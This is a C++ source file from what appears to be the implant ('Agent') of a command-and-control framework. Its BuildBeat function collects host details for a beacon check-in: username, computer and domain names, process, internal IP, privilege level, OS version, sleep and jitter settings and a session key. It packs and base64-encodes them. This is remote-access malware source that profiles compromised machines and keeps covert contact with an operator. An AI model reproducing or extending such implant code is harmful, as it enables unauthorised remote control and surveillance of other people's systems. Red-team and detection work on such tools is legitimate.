#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Encoders.h"

Agent::Agent()
{
	this->info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
	*this->info = AgentInfo();
	
	this->config  = (AgentConfig*)MemAllocLocal(sizeof(AgentConfig));
	*this->config = AgentConfig();

}

Agent::~Agent()
{

}

LPSTR Agent::BuildBeat()
{
	BYTE flag = 0;
	flag += this->info->is_server; 
	flag <<= 1;
	flag += this->info->elevated;
	flag <<= 1;
	flag += this->info->sys64;
	flag <<= 1;
	flag += this->info->arch64;

	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
	*packer = Packer();
	
	packer->Add32(this->config->agent_type);
	packer->Add32(this->config->sleep_delay);
	packer->Add32(this->config->jitter_delay);
	packer->Add32(this->info->agent_id);
	packer->Add16(this->info->acp);
	packer->Add16(this->info->oemcp);
	packer->Add8(this->info->gmt_offest);
	packer->Add16(this->info->pid);
	packer->Add16(this->info->tid);
	packer->Add32(this->info->build_number);
	packer->Add8(this->info->major_version);
	packer->Add8(this->info->minor_version);
	packer->Add32(this->info->internal_ip);
	packer->Add8( flag );
	packer->AddBytes(this->config->session_key, 16);
	packer->AddStringA(this->info->domain_name);
	packer->AddStringA(this->info->computer_name);
	packer->AddStringA(this->info->username);
	packer->AddStringA(this->info->process_name);

	PBYTE beat = packer->GetData();
	ULONG beat_size = packer->GetDataSize();

	LPSTR encoded_beat = b64_encode(beat, beat_size);

	return encoded_beat;
}